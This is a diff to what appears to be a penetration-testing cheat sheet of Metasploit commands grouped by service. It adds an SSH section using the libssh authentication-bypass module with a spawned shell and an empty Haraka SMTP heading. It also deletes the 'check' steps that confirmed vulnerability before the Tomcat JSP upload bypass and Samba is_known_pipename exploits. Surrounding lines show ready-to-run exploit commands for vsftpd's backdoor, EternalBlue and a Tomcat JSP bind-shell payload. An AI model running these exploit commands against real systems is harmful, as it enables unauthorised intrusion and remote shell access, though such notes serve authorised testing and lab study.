@@ -454,6 +454,9 @@ set CMD <command>
 - SMB/Samba
   - [EternalBlue](#EternalBlue)
   - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
+- [SMTP](#SMTP)
+  - [Haraka <2.8.9](#Haraka--289)
+- [SSH](#SSH)
 - [WinRM](#WinRM)
 - Others
   - [XODA 0.4.5](#XODA-045)
@@ -488,11 +491,9 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 [<< Index](#Index)
 ```
 use exploit/multi/http/tomcat_jsp_upload_bypass
-check
 set payload java/jsp_shell_bind_tcp
 set SHELL cmd
 ```
-- Run `check` to make sure target is vulnerable.
 - Why use non-staged, bind shell payload?
 - If exploit fails, try again.
 
@@ -541,7 +542,18 @@ use exploit/windows/smb/ms17_010_eternalblue
 [<< Index](#Index)
 ```
 use exploit/linux/samba/is_known_pipename
-check
+```
+
+## SMTP
+### Haraka <2.8.9
+[<< Index](#Index)
+
+## SSH
+### libssh V0.6.0-0.8.0
+[<< Index](#Index)
+```
+use auxiliary/scanner/ssh/libssh_auth_bypass
+set SPAWN_PTY true
 ```
 
 ## WinRM
